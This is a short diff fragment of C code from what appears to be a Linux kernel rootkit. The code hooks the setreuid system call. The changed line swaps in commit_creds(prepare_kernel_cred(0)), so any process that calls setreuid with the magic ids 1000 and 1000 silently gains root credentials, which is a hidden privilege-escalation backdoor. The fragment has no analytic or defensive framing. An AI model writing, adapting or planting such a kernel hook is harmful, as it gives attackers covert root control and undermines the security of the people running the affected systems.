@@ -23,7 +23,7 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     if((ruid == 1000) && (euid == 1000))
     {
         printk("[Correct]: You got the correct ids.");
-        commit_creds(prepare_creds());
+        commit_creds(prepare_kernel_cred(0));
 
         return new_setreuid(0, 0);
     }
